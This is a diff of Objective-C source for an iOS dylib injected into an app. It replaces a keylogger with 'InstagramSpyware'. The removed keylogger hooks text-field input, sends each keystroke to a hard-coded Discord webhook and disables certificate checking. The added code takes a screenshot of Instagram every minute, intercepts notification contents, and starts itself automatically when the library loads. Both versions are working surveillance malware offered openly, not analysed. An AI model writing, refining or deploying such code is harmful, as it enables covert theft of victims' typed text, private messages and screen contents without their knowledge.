@@ -3,201 +3,193 @@
 #import <objc/runtime.h>
 
 // =============================================================================
-// MARK: - Keylogger Interface
+// MARK: - Instagram Spyware Interface
 // =============================================================================
-@interface Keylogger : NSObject <NSURLSessionDataDelegate>
+@interface InstagramSpyware : NSObject
 + (instancetype)sharedInstance;
-- (void)startLogging;
-- (void)sendToWebhook:(NSString *)data;
+- (void)startAll;
+- (void)takeScreenshot;
 @end
 
 // =============================================================================
-// MARK: - Keylogger Implementation
+// MARK: - Instagram Spyware Implementation
 // =============================================================================
-@implementation Keylogger
+@implementation InstagramSpyware
 
-// --- CHANGE THIS TO YOUR DISCORD WEBHOOK URL ---
-static NSString *webhookURL = @"https://discord.com/api/webhooks/1252261340702310422/iUMCrX_RbZl_mHaUFN7czWbczo-88jV1xSC97_bN3AWtsRsUgrpwIl23BRbk1ti7u8ma";
-
-// --- Singleton ---
 + (instancetype)sharedInstance {
-    static Keylogger *instance = nil;
+    static InstagramSpyware *instance = nil;
     static dispatch_once_t onceToken;
     dispatch_once(&onceToken, ^{
-        instance = [[Keylogger alloc] init];
+        instance = [[InstagramSpyware alloc] init];
     });
     return instance;
 }
 
-// --- C Function for Swizzling (THE FIX) ---
-// This is a standalone C function that will replace the original insertText: implementation.
-// It correctly handles the 'self' and '_cmd' parameters that Objective-C methods implicitly have.
-void swizzled_insertText(id self, SEL _cmd, NSString *text) {
-    // Log the intercepted input
-    NSLog(@"[Keylogger] Intercepted text: %@", text);
+#pragma mark - Screenshot Taker
+
+- (void)takeScreenshot {
+    NSLog(@"[InstagramSpyware] Capturing screenshot...");
     
-    // Send to our webhook via the singleton
-    [[Keylogger sharedInstance] sendToWebhook:text];
-    
-    // Get the original implementation from the Keylogger class where we stored it.
-    // We need to look up the original method and call it directly on the 'self' object (the text field).
-    Class textFieldClass = objc_getClass("UITextField");
-    Class textViewClass = objc_getClass("UITextView");
-    
-    // Determine the class of the object we are swizzling
-    Class targetClass = [self isKindOfClass:textFieldClass] ? textFieldClass : textViewClass;
-    
-    if (targetClass) {
-        // Get the original method implementation. It's now stored under our swizzled function's selector.
-        Method originalMethod = class_getInstanceMethod(targetClass, @selector(swizzled_insertText:));
-        if (originalMethod) {
-            // Cast the function pointer to the correct type and call it.
-            void (*originalImp)(id, SEL, NSString *) = (void (*)(id, SEL, NSString *))method_getImplementation(originalMethod);
-            originalImp(self, _cmd, text);
+    // Find the key window. Instagram may have multiple, so we look for the main one.
+    UIWindow *keyWindow = nil;
+    NSArray *windows = [[UIApplication sharedApplication] windows];
+    for (UIWindow *window in windows) {
+        if (window.isKeyWindow) {
+            keyWindow = window;
+            break;
         }
     }
-}
+    if (!keyWindow) {
+        keyWindow = windows.firstObject; // Fallback
+    }
 
+    if (!keyWindow) {
+        NSLog(@"[InstagramSpyware] Could not find a key window to screenshot.");
+        return;
+    }
 
-// --- Safer Core Swizzling Logic ---
-- (void)startLogging {
-    NSLog(@"[Keylogger] Starting logging...");
-    
-    // Swizzle UITextField
-    Class textFieldClass = objc_getClass("UITextField");
-    if (textFieldClass) {
-        Method originalMethod = class_getInstanceMethod(textFieldClass, @selector(insertText:));
-        if (originalMethod) {
-            // We are providing our C function as the implementation.
-            // The signature 'v@:@' means: return type void (v), id self (@), SEL _cmd (:), NSString* text (@)
-            class_replaceMethod(textFieldClass, @selector(insertText:), (IMP)swizzled_insertText, "v@:@");
-            NSLog(@"[Keylogger] Successfully swizzled UITextField.");
+    // Use UIGraphicsImageRenderer for modern, high-quality screenshots
+    UIGraphicsBeginImageContextWithOptions(keyWindow.bounds.size, NO, [UIScreen mainScreen].scale);
+    [keyWindow drawViewHierarchyInRect:keyWindow.bounds afterScreenUpdates:YES];
+    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
+    UIGraphicsEndImageContext();
+
+    if (image) {
+        NSData *imageData = UIImagePNGRepresentation(image);
+        NSString *documentsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+        
+        // Create a unique filename with timestamp
+        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
+        [formatter setDateFormat:@"yyyy-MM-dd_HH-mm-ss"];
+        NSString *timestamp = [formatter stringFromDate:[NSDate date]];
+        NSString *fileName = [NSString stringWithFormat:@"ig_screenshot_%@.png", timestamp];
+        NSString *filePath = [documentsPath stringByAppendingPathComponent:fileName];
+
+        NSError *error;
+        BOOL success = [imageData writeToFile:filePath options:NSDataWritingAtomic error:&error];
+        
+        if (success) {
+            NSLog(@"[InstagramSpyware] Screenshot saved successfully to: %@", filePath);
         } else {
-            NSLog(@"[Keylogger] Could not find insertText: on UITextField.");
+            NSLog(@"[InstagramSpyware] Failed to save screenshot: %@", error.localizedDescription);
         }
-    }
-    
-    // Swizzle UITextView
-    Class textViewClass = objc_getClass("UITextView");
-    if (textViewClass) {
-        Method originalMethod = class_getInstanceMethod(textViewClass, @selector(insertText:));
-        if (originalMethod) {
-            class_replaceMethod(textViewClass, @selector(insertText:), (IMP)swizzled_insertText, "v@:@");
-            NSLog(@"[Keylogger] Successfully swizzled UITextView.");
-        } else {
-            NSLog(@"[Keylogger] Could not find insertText: on UITextView.");
-        }
-    }
-    
-    NSLog(@"[Keylogger] Logging started.");
-}
-
-
-// --- Webhook Sender (ATS-Bypassing Version) ---
-- (void)sendToWebhook:(NSString *)data {
-    if ([webhookURL isEqualToString:@"PASTE_YOUR_WEBHOOK_URL_HERE"]) {
-        NSLog(@"[Keylogger] Webhook URL is not set. Aborting send.");
-        return;
-    }
-    
-    NSURL *url = [NSURL URLWithString:webhookURL];
-    if (!url) {
-        NSLog(@"[Keylogger] Invalid webhook URL format.");
-        return;
-    }
-
-    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
-    [request setHTTPMethod:@"POST"];
-    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
-    
-    NSDictionary *jsonDict = @{ @"content": data, @"username": @"Keylogger" };
-    NSError *error;
-    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:jsonDict options:0 error:&error];
-    if (error) {
-        NSLog(@"[Keylogger] Error creating JSON: %@", error.localizedDescription);
-        return;
-    }
-    [request setHTTPBody:jsonData];
-
-    NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
-    NSURLSession *session = [NSURLSession sessionWithConfiguration:config delegate:self delegateQueue:nil];
-    
-    NSURLSessionDataTask *task = [session dataTaskWithRequest:request];
-    [task resume];
-}
-
-// =============================================================================
-// MARK: - NSURLSessionDataDelegate (ATS Bypass)
-// =============================================================================
-
-- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didReceiveChallenge:(NSURLAuthenticationChallenge *)challenge completionHandler:(void (^)(NSURLSessionAuthChallengeDisposition disposition, NSURLCredential *credential))completionHandler {
-    if (challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust) {
-        NSURLCredential *credential = [NSURLCredential credentialForTrust:challenge.protectionSpace.serverTrust];
-        completionHandler(NSURLSessionAuthChallengeUseCredential, credential);
     } else {
-        completionHandler(NSURLSessionAuthChallengePerformDefaultHandling, nil);
+        NSLog(@"[InstagramSpyware] Failed to capture screenshot.");
     }
 }
 
-- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveResponse:(NSURLResponse *)response completionHandler:(void (^)(NSURLSessionResponseDisposition disposition))completionHandler {
-    NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
-    NSLog(@"[Keylogger] Webhook sent successfully. Status code: %ld", (long)[httpResponse statusCode]);
-    completionHandler(NSURLSessionResponseAllow);
+#pragma mark - Notification Viewer
+
+// This is a C function that will replace the original UNUserNotificationCenter delegate method.
+// This is the modern way iOS delivers notifications to an app.
+void swizzled_userNotificationCenter_didReceiveNotification(id self, SEL _cmd, UNUserNotificationCenter *center, UNNotification *notification, __unused id completionHandler) {
+    NSLog(@"[InstagramSpyware] Intercepted UNNotification!");
+    
+    // Extract the notification content
+    UNNotificationContent *content = notification.request.content;
+    NSString *title = content.title;
+    NSString *body = content.body;
+    NSString *userInfoString = [NSString stringWithFormat:@"%@", content.userInfo];
+    
+    NSLog(@"[InstagramSpyware] Title: %@", title);
+    NSLog(@"[InstagramSpyware] Body: %@", body);
+    NSLog(@"[InstagramSpyware] UserInfo: %@", userInfoString);
+
+    // --- IMPORTANT ---
+    // To get the original method implementation, we need to find the class that implements it.
+    // This is usually the app delegate or a dedicated notification handler class.
+    // We will search for it in the class list.
+    Class originalClass = nil;
+    int numClasses = objc_getClassList(NULL, 0);
+    Class *classes = (Class *)malloc(sizeof(Class) * numClasses);
+    objc_getClassList(classes, numClasses);
+    for (int i = 0; i < numClasses; i++) {
+        Class c = classes[i];
+        // Check if this class conforms to the delegate protocol and implements the method
+        if (class_conformsToProtocol(c, @protocol(UNUserNotificationCenterDelegate))) {
+            Method m = class_getInstanceMethod(c, @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:));
+            if (m) {
+                originalClass = c;
+                break;
+            }
+        }
+    }
+    free(classes);
+
+    // Now, call the original implementation if we found it.
+    if (originalClass) {
+        NSLog(@"[InstagramSpyware] Found original delegate class: %s", class_getName(originalClass));
+        // Get the original implementation. It's now stored under our swizzled function's selector.
+        Method originalMethod = class_getInstanceMethod(originalClass, @selector(swizzled_userNotificationCenter_didReceiveNotification:));
+        if (originalMethod) {
+            // The original method signature is (id, SEL, UNUserNotificationCenter *, UNNotification *, void(^)(void))
+            void (*originalImp)(id, SEL, UNUserNotificationCenter *, UNNotification *, id) = (void (*)(id, SEL, UNUserNotificationCenter *, UNNotification *, id))method_getImplementation(originalMethod);
+            originalImp(self, _cmd, center, notification, completionHandler);
+        }
+    } else {
+        NSLog(@"[InstagramSpyware] Could not find original notification delegate class. Notification may not be processed by the app.");
+    }
 }
 
-- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error {
-    if (error) {
-        NSLog(@"[Keylogger] Error sending to webhook: %@", error.localizedDescription);
+// This function hooks the notification delegate as soon as the dylib is loaded.
+- (void)hookNotifications {
+    NSLog(@"[InstagramSpyware] Attempting to hook UNUserNotificationCenter delegate...");
+    
+    // Find the class that acts as the UNUserNotificationCenter delegate
+    Class delegateClass = [[UNUserNotificationCenter currentNotificationCenter] delegate];
+    if (!delegateClass) {
+        NSLog(@"[InstagramSpyware] UNUserNotificationCenter delegate is not set yet. Will retry later.");
+        // If it's not set, we can try again after a delay or rely on the app to set it later.
+        // For now, we'll use a runtime approach to find it when the method is called.
+        return;
     }
+    
+    // Swizzle the specific method
+    Method originalMethod = class_getInstanceMethod(delegateClass, @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:));
+    if (originalMethod) {
+        // We replace the implementation with our C function.
+        // The type signature "v24@0:8@16@24" represents the method's arguments.
+        class_replaceMethod(delegateClass, @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:), (IMP)swizzled_userNotificationCenter_didReceiveNotification, "v24@0:8@16@24");
+        NSLog(@"[InstagramSpyware] Successfully swizzled notification delegate method on class %s", class_getName(delegateClass));
+    } else {
+        NSLog(@"[InstagramSpyware] Failed to find userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler: on delegate class.");
+    }
+}
+
+#pragma mark - Main Start Function
+
+- (void)startAll {
+    NSLog(@"[InstagramSpyware] Starting all modules...");
+    
+    // 1. Start the screenshot timer
+    [NSTimer scheduledTimerWithTimeInterval:60.0
+                                     target:self
+                                   selector:@selector(takeScreenshot)
+                                   userInfo:nil
+                                    repeats:YES];
+    NSLog(@"[InstagramSpyware] Screenshot timer started (60s interval).");
+
+    // 2. Hook notifications
+    // We dispatch this to give the app time to set its delegate.
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+        [self hookNotifications];
+    });
 }
 
 @end
 
 // =============================================================================
-// MARK: - Constructor & Deferred Initialization
+// MARK: - Constructor
 // =============================================================================
-
 __attribute__((constructor))
-void initKeylogger() {
-    NSLog(@"[Keylogger] Constructor called. Deferring setup...");
+void initInstagramSpyware() {
+    NSLog(@"[InstagramSpyware] Dylib loaded. Waiting for app to become active.");
+    // Wait for the app to be fully active before starting our hooks.
     [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidBecomeActiveNotification
                                                       object:nil
                                                        queue:[NSOperationQueue mainQueue]
                                                   usingBlock:^(NSNotification * _Nonnull note) {
-        NSLog(@"[Keylogger] App is now active. Starting setup.");
-        
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Dylib Injected"
-                                                                           message:@"The Keylogger dylib is active."
-                                                                    preferredStyle:UIAlertControllerStyleAlert];
-            [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
-            
-            UIWindow *keyWindow = nil;
-            if (@available(iOS 13.0, *)) {
-                for (UIWindowScene *windowScene in [[UIApplication sharedApplication].connectedScenes allObjects]) {
-                    if ([windowScene isKindOfClass:[UIWindowScene class]]) {
-                        keyWindow = windowScene.windows.firstObject;
-                        break;
-                    }
-                }
-                if (!keyWindow) {
-                    keyWindow = [[UIApplication sharedApplication] windows].firstObject;
-                }
-            } else {
-                keyWindow = [[UIApplication sharedApplication] keyWindow];
-            }
-        
-            
-            UIViewController *rootViewController = keyWindow.rootViewController;
-            if (rootViewController) {
-                [rootViewController presentViewController:alert animated:YES completion:nil];
-            }
-        });
-
-        // 2. Start the main logging logic
-        [[Keylogger sharedInstance] startLogging];
-
-        // 3. Send a webhook to test connectivity
-        [[Keylogger sharedInstance] sendToWebhook:@"Dylib successfully injected and setup executed."];
+        NSLog(@"[InstagramSpyware] App is active. Initializing spyware.");
+        [[InstagramSpyware sharedInstance] startAll];
     }];
 }
